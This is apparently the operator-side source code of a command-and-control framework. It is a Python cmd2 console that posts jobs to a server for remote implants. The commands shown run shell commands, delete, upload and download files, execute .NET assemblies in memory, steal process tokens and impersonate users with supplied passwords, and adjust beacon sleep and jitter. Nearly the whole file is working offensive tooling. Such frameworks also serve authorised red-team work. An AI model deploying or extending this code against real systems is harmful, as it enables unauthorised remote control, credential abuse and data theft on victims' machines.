import argparse
import connect
import cmd2
import base64

from cmd2 import CommandSet, with_default_category, with_argparser
from requests import post


def post_job(job):
    """ Excepts a job of the following format: "name":"<name>", "arguments":"[argument, argument]" """
    job_string = f'{{"api_key":"{connect.client.api_key}","connection_id":"{connect.client.current_connection}",{job}}}'
    post(f'{connect.client.server_uri}/jobs', job_string)


@with_default_category('[Standard API]')
class STDAPICommands(CommandSet):
    def __init__(self):
        super().__init__()

    """ 
    Dir Command 
    """

    dir_parser = cmd2.Cmd2ArgumentParser()
    dir_parser.add_argument('dir', help='the directory to inspect')

    @with_argparser(dir_parser)
    def do_dir(self, ns: argparse.Namespace):
        """ List the contents and properties of a directory. """
        if not connect.client.current_connection:
            print('Please select a connection with \'*<connection_id>\'')
            return
        directory_bytes = base64.b64encode(ns.dir.encode())
        directory_str = str(directory_bytes, "utf-8")
        post_job(f'"name":"dir","arguments":"{directory_str}","type":1')

    """ 
    DelFile Command 
    """

    del_file_parser = cmd2.Cmd2ArgumentParser()
    del_file_parser.add_argument('file', help='the file to delete')

    @with_argparser(del_file_parser)
    def do_delfile(self, ns: argparse.Namespace):
        """ List the contents and properties of a directory. """
        if not connect.client.current_connection:
            print('Please select a connection with \'*<connection_id>\'')
            return
        file_bytes = base64.b64encode(ns.file.encode())
        file_str = str(file_bytes, "utf-8")
        post_job(f'"name":"delfile","arguments":"{file_str}","type":1')

    """ 
    Shell Command 
    """

    shell_parser = cmd2.Cmd2ArgumentParser()
    shell_parser.add_argument('command', help='Command to execute')

    @with_argparser(shell_parser)
    def do_cmd(self, ns: argparse.Namespace):
        """ Execute a command. """
        if not connect.client.current_connection:
            print('Please select a connection with \'*<connection_id>\'')
            return
        arg_bytes = base64.b64encode(ns.command.encode())
        arg_str = str(arg_bytes, 'utf-8')
        post_job(f'"name":"cmd","arguments":"{arg_str}","type":1')

    """ 
    Sleep Command 
    """

    dir_sleep = cmd2.Cmd2ArgumentParser()
    dir_sleep.add_argument('sleep', help='amount of time in milliseconds to sleep for')
    dir_sleep.add_argument('jitter', help='percentage of sleep to add or subtract per check_in')

    @with_argparser(dir_sleep)
    def do_sleep(self, ns: argparse.Namespace):
        """ Change the sleep and jitter to alter the check_in interval. """
        if not connect.client.current_connection:
            print('Please select a connection with \'*<connection_id>\'')
            return
        sleep_bytes = base64.b64encode(ns.sleep.encode())
        sleep_str = str(sleep_bytes, "utf-8")
        jitter_bytes = base64.b64encode(ns.jitter.encode())
        jitter_str = str(jitter_bytes, "utf-8")
        post_job(f'"name":"sleep","arguments":"{sleep_str},{jitter_str}","type":1')

    """ 
    Download Command 
    """

    dir_sleep = cmd2.Cmd2ArgumentParser()
    dir_sleep.add_argument('file', help='the file to download')

    @with_argparser(dir_sleep)
    def do_download(self, ns: argparse.Namespace):
        """ Download a remote file. """
        if not connect.client.current_connection:
            print('Please select a connection with \'*<connection_id>\'')
            return
        file_bytes = base64.b64encode(ns.file.encode())
        file_str = str(file_bytes, "utf-8")
        post_job(f'"name":"download","arguments":"{file_str}","type":2')

    """ 
    Upload Command 
    """

    dir_parser = cmd2.Cmd2ArgumentParser()
    dir_parser.add_argument('file', completer=cmd2.Cmd.path_complete, help='file to upload')
    dir_parser.add_argument('path', help='path to upload to')

    @with_argparser(dir_parser)
    def do_upload(self, ns: argparse.Namespace):
        """ Uploads a file to the remote machine. """
        if not connect.client.current_connection:
            print('Please select a connection with \'*<connection_id>\'')
            return
        with open(ns.file, 'rb') as fd:
            file_bytes = base64.b64encode(fd.read())
        file_str = file_bytes.decode('utf-8')
        path_bytes = base64.b64encode(ns.path.encode())
        path_str = str(path_bytes, 'utf-8')
        post_job(f'"name":"upload","arguments":"{file_str},{path_str}","type":1')

    """ 
    Whoami Command 
    """

    def do_whoami(self, _: cmd2.Statement):
        """ Retrieve the username of the user. """
        if not connect.client.current_connection:
            print('Please select a connection with \'*<connection_id>\'')
            return
        post_job('"name":"whoami","arguments":"","type":1')

    """ 
    Hostname Command 
    """

    def do_hostname(self, _: cmd2.Statement):
        """ Retrieve the hostname of the machine. """
        if not connect.client.current_connection:
            print('Please select a connection with \'*<connection_id>\'')
            return
        post_job('"name":"hostname","arguments":"","type":1')

    """ 
    OS Command 
    """

    def do_os(self, _: cmd2.Statement):
        """ Retrieve the operating system's product and build information. """
        if not connect.client.current_connection:
            print('Please select a connection with \'*<connection_id>\'')
            return
        post_job(f'"name":"os","arguments":"","type":1')


@with_default_category('CSharp')
class CSharp(CommandSet):
    def __init__(self):
        super().__init__()

    """ 
    Execute Assembly Command 
    """

    dir_parser = cmd2.Cmd2ArgumentParser()
    dir_parser.add_argument('assembly', completer=cmd2.Cmd.path_complete, help='.NET assembly to execute')
    dir_parser.add_argument('args', nargs='*', help='arguments to the assembly', default='')

    @with_argparser(dir_parser)
    def do_execute_assembly(self, ns: argparse.Namespace):
        """ Executes a .NET assembly with reflection """
        if not connect.client.current_connection:
            print('Please select a connection with \'*<connection_id>\'')
            return
        with open(ns.assembly, 'rb') as fd:
            file_bytes = base64.b64encode(fd.read())
        file_str = file_bytes.decode('utf-8')
        arg_str = ''
        for arg in ns.args:
            arg_str = arg_str + ',' + str(base64.b64encode(arg.encode()), 'utf-8')
        post_job(f'"name":"execute_assembly","arguments":"{file_str}{arg_str}","type":1')

    """ 
    PWD Command 
    """

    def do_pwd(self, _: cmd2.Statement):
        """ Prints the current working directory. """
        if not connect.client.current_connection:
            print('Please select a connection with \'*<connection_id>\'')
            return
        post_job(f'"name":"pwd","arguments":"","type":1')

    """ 
    CD Command 
    """
    cd_parser = cmd2.Cmd2ArgumentParser()
    cd_parser.add_argument('directory', completer=cmd2.Cmd.path_complete, help='directory to change to')

    @with_argparser(cd_parser)
    def do_cd(self, ns: argparse.Namespace):
        """ Changes the current working directory. """
        if not connect.client.current_connection:
            print('Please select a connection with \'*<connection_id>\'')
            return
        arg_bytes = base64.b64encode(ns.directory.encode())
        arg_str = str(arg_bytes, 'utf-8')
        post_job(f'"name":"cd","arguments":"{arg_str}","type":1')

    """ 
    PS Command 
    """

    def do_ps(self, _: cmd2.Statement):
        """ Retrieves current process information. """
        if not connect.client.current_connection:
            print('Please select a connection with \'*<connection_id>\'')
            return
        post_job(f'"name":"ps","arguments":"","type":1')

    """ 
    Rev2Self Command 
    """

    def do_rev2self(self, _: cmd2.Statement):
        """ Drops all impersonated tokens. """
        if not connect.client.current_connection:
            print('Please select a connection with \'*<connection_id>\'')
            return
        post_job(f'"name":"rev2self","arguments":"","type":1')

    """ 
    Rev2Self Command 
    """

    def do_get_token(self, _: cmd2.Statement):
        """ Drops all impersonated tokens. """
        if not connect.client.current_connection:
            print('Please select a connection with \'*<connection_id>\'')
            return
        post_job(f'"name":"get_token","arguments":"","type":1')

    """ 
    MakeToken Command 
    """

    make_token_parser = cmd2.Cmd2ArgumentParser()
    make_token_parser.add_argument('domain', help='The domain to impersonate for')
    make_token_parser.add_argument('username', help='User to impersonate')
    make_token_parser.add_argument('password', help='The password of the user')

    @with_argparser(make_token_parser)
    def do_make_token(self, ns: argparse.Namespace):
        """ Impersonate a user's token. """
        if not connect.client.current_connection:
            print('Please select a connection with \'*<connection_id>\'')
            return
        domain_bytes = base64.b64encode(ns.domain.encode())
        domain_str = str(domain_bytes, 'utf-8')
        user_bytes = base64.b64encode(ns.username.encode())
        user_str = str(user_bytes, 'utf-8')
        password_bytes = base64.b64encode(ns.password.encode())
        password_str = str(password_bytes, 'utf-8')
        post_job(f'"name":"make_token","arguments":"{domain_str},{user_str},{password_str}","type":1')

    """ 
    StealToken Command 
    """

    steal_token_parser = cmd2.Cmd2ArgumentParser()
    steal_token_parser.add_argument('pid', help='The pid of the process to impersonate.')

    @with_argparser(steal_token_parser)
    def do_steal_token(self, ns: argparse.Namespace):
        """ Impersonate a processes token. """
        if not connect.client.current_connection:
            print('Please select a connection with \'*<connection_id>\'')
            return
        arg_bytes = base64.b64encode(ns.pid.encode())
        arg_str = str(arg_bytes, 'utf-8')
        post_job(f'"name":"steal_token","arguments":"{arg_str}","type":1')


